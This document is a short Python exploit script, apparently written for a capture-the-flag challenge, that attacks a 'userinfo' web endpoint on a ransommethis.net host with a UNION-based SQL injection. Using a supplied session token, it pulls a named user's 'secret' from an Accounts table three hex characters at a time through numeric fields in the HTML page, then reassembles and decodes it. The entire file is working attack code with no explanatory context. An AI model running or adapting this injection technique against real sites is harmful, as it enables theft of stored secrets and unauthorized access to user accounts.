#!/usr/bin/python3

import re
import requests
import sys

try:
    token = sys.argv[1]
except IndexError:
    print('Login token value not provided')
    exit(1)
url = "https://xekflqhmhrsoelot.ransommethis.net/jphzwhdbesknahns/userinfo"

def query_inject(i, user='HelpfulHandball'):
    return f"idk' union select u2.memberSince, instr('0123456789ABCDEF', substr(hex(a2.secret), {i}, 1)), instr('0123456789ABCDEF', substr(hex(a2.secret), {i+1}, 1)), instr('0123456789ABCDEF', substr(hex(a2.secret), {i+2}, 1)) from UserInfo u2 inner join Accounts a2 on u2.uid=a2.uid where a2.userName='{user}';--"

secret = ''
pattern = re.compile(r'^.*<h3> Jobs Completed: </h3>[\s]+<p>(\d+)</p>.*<h3> Users Helped: </h3>\s+<p>(\d+)</p>.*<h3> Programs Contributed: </h3>\s+<p>(\d+)</p>', re.S)
for i in range(1, 66, 3):
    resp = requests.get(url, params={'user':query_inject(i, user='HelpfulHandball')}, cookies={'tok':token})
    res = [hex(int(i) - 1)[2:] for i in pattern.search(resp.text).group(1, 2, 3)]
    secret += ''.join(res)
    print(res)

print(secret[:-2])
print(int(secret[:-2], 16).to_bytes(32, byteorder='big').decode())